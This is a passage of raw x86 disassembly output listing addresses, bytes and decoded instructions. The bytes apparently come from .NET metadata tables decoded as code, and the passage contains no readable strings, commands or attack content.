  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 56 19 0a    	add    %dl,0xa195600(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 ac 02 94 00 10 00 	add    %ch,0x100094(%edx,%eax,1)
  406384:	24 2f                	and    $0x2f,%al
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 cd                	add    %cl,%ch
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 8f 19 9a    	add    %dl,-0x65e67100(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 06 0d 9a    	add    %dl,-0x65f2fa00(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 13                	add    %dl,(%ebx)
  4063c5:	0f 0a                	(bad)
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	07                   	pop    %es
  4063d3:	15 0e 00 14 00       	adc    $0x14000e,%eax
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 45 17 0a    	add    %dl,0xa174500(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 62 0e 1d    	add    %dl,0x1d0e6200(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 6f 02 1d    	add    %dl,0x1d026f00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 51 14 1d    	add    %dl,0x1d145100(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 ed                	add    %ch,%ch
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 8e 05 1d 00 14    	add    %cl,0x14001d05(%esi)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	07                   	pop    %es
  406435:	15 0e 00 14 00       	adc    $0x14000e,%eax
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 f8                	add    %bh,%al
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 35 0d c7 00 14    	add    %dh,0x1400c70d
  406455:	00 5c 37 00          	add    %bl,0x0(%edi,%esi,1)
  406459:	00 00                	add    %al,(%eax)
  40645b:	00 96 00 1a 12 53    	add    %dl,0x53121a00(%esi)
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 dd 10 1d    	add    %dl,0x1d10dd00(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 ed 19 0a    	add    %dl,0xa19ed00(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b9 18 c3    	add    %dl,-0x3ce74700(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 89 13 d5    	add    %dl,-0x2aec7700(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 7f 12 0a    	add    %dl,0xa127f00(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 96 06 c3    	add    %dl,-0x3cf96a00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 3e 1c 1d    	add    %dl,0x1d1c3e00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 33 1c 0a    	add    %dl,0xa1c3300(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 06    	add    %al,0x6209600(%eax)
  4064dd:	1c e0                	sbb    $0xe0,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 f1    	add    %al,-0xedf6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 ef    	add    %al,-0x10df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 07                	and    %al,(%edi)
  406507:	1b f1                	sbb    %ecx,%esi
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 c3    	add    %al,-0x3cdf6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 84 0e ff 00 1d 00 	and    %al,0x1d00ff(%esi,%ecx,1)
  406528:	ad                   	lods   %ds:(%esi),%eax
  406529:	21 00                	and    %eax,(%eax)
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 cd 0b 1c    	add    %dl,0x1c0bcd00(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 6f 19 0a    	add    %dl,0xa196f00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 f5                	add    %dh,%ch
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 c1 0a 23    	add    %dl,0x230ac100(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 b8 0a 2a 01 24    	add    %bh,0x24012a0a(%eax)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 a1 0a 84    	add    %dl,-0x7bf55f00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 b4 1c 1d    	add    %dl,0x1d1cb400(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 15 03 9a    	add    %dl,-0x65fceb00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 9e 05 38 01 27    	add    %bl,0x27013805(%esi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 6b 03 0a    	add    %dl,0xa036b00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 a3 14 3e    	add    %dl,0x3e14a300(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 0d 15 0a 00 29    	sbb    %cl,0x29000a15
  4065dd:	00 f4                	add    %dh,%ah
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	07                   	pop    %es
  4065e7:	15 6b 01 29 00       	adc    $0x29016b,%eax
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 7e 1b 70    	add    %al,0x701b7e00(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 7e 1b 75    	add    %al,0x751b7e00(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	76 1b                	jbe    0x40662d
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 76 1b 75    	add    %al,0x751b7600(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e9 0e 7c 01    	addl   $0x17c0ee9,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 1f                	add    %bl,(%edi)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 1f                	add    %bl,(%edi)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 44 16 2a    	add    %dl,0x2a164400(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 b5 0c 93 01 33    	add    %dh,0x3301930c(%ebp)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 8f 0c 93    	add    %dl,-0x6cf37100(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 bf 0c 93 01 35    	add    %bh,0x3501930c(%edi)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 8b 16 84 01 36    	add    %cl,0x36018416(%ebx)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 df 00 99    	add    %dl,-0x66ff2100(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 7f 00 9f    	add    %dl,-0x60ff8100(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 fa 00 a5    	add    %dl,-0x5aff0600(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 c6 05 ab    	add    %dl,-0x54fa3a00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	07                   	pop    %es
  4066e3:	15 0e 00 3b 00       	adc    $0x3b000e,%eax
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 0d 15 0a 00 3b    	sbb    %cl,0x3b000a15
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 07 15 b1    	add    %al,-0x4eeaf8e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 d1                	or     %edx,%ecx
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 bd 1b bf 01 3c    	add    %edi,0x3c01bf1b(%ebp)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	ac                   	lods   %ds:(%esi),%al
  406729:	19 0e                	sbb    %ecx,(%esi)
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 07 15 cb    	add    %al,-0x34eaf8e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 2b 03 d7    	add    %al,-0x28fcd500(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 2b 03 dc    	add    %al,-0x23fcd500(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 2b 03 e2    	add    %al,-0x1dfcd500(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 2b 03 e8    	add    %al,-0x17fcd500(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 d7 0f ee    	add    %al,-0x11f028f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	83 0d f4 01 42 00 e6 	orl    $0xffffffe6,0x4201f4
  406791:	23 00                	and    (%eax),%eax
  406793:	00 00                	add    %al,(%eax)
  406795:	00 81 00 95 07 6b    	add    %al,0x6b079500(%ecx)
  40679b:	01 42 00             	add    %eax,0x0(%edx)
  40679e:	48                   	dec    %eax
  40679f:	46                   	inc    %esi
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 cc 12 0e 00    	addl   $0xe12cc,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 26 03 d7 01    	addl   $0x1d70326,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 6f 0b 0a 02    	addl   $0x20a0b6f,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	16                   	push   %ss
  4067d1:	19 dc                	sbb    %ebx,%esp
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 a4 04 d7    	add    %al,-0x28fb5c00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 b5 04 d7    	add    %al,-0x28fb4b00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 ba 04 d7    	add    %al,-0x28fb4600(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 76 12 0f 02    	addl   $0x20f1276,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 50 1c 0f 02    	addl   $0x20f1c50,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	e0 13                	loopne 0x406839
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 cb 00 1a    	add    %al,0x1a00cb00(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 bf 00 1f    	add    %al,0x1f00bf00(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	d3 13                	rcll   %cl,(%ebx)
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	00 19                	add    %bl,(%ecx)
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	b0 16                	mov    $0x16,%al
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406879:	16                   	push   %ss
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 2b 03 36    	add    %al,0x36032b00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 2b                	add    %ch,(%ebx)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 95 16 42    	add    %al,0x42169500(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 6a 06 42    	add    %al,0x42066a00(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	36 19 dc             	ss sbb %ebx,%esp
  4068c1:	01 50 00             	add    %edx,0x0(%eax)
  4068c4:	b0 24                	mov    $0x24,%al
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	86 00                	xchg   %al,(%eax)
  4068cc:	51                   	push   %ecx
  4068cd:	0f 0e                	femms
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a9 0c 6b    	add    %al,0x6b0ca900(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 9d 0c 47    	add    %al,0x470c9d00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 81 10 4b    	add    %al,0x4b108100(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	43                   	inc    %ebx
  406905:	06                   	push   %es
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	0b 19                	or     (%ecx),%ebx
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	7b 16                	jnp    0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	5b                   	pop    %ebx
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	99                   	cltd
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	37                   	aaa
  40694b:	16                   	push   %ss
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	68 0f 0f 02 58       	push   $0x58020f0f
  40695d:	00 34 25 00 00 00 00 	add    %dh,0x0(,%eiz,1)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	75 0c                	jne    0x406974
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	82 0c 6b 01          	orb    $0x1,(%ebx,%ebp,2)
  406978:	59                   	pop    %ecx
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	b7 13                	mov    $0x13,%bh
  406984:	23 02                	and    (%edx),%eax
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	c5 13                	lds    (%ebx),%edx
  406992:	15 02 5a 00 56       	adc    $0x56005a02,%eax
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	e8 18 27 02 5b       	call   0x5b4290bb
  4069a3:	00 5e 25             	add    %bl,0x25(%esi)
  4069a6:	00 00                	add    %al,(%eax)
  4069a8:	00 00                	add    %al,(%eax)
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	f4                   	hlt
  4069ad:	18 55 02             	sbb    %dl,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	80 1c 5a 02          	sbbb   $0x2,(%edx,%ebx,2)
  4069be:	5c                   	pop    %esp
  4069bf:	00 67 25             	add    %ah,0x25(%edi)
  4069c2:	00 00                	add    %al,(%eax)
  4069c4:	00 00                	add    %al,(%eax)
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	fd                   	std
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
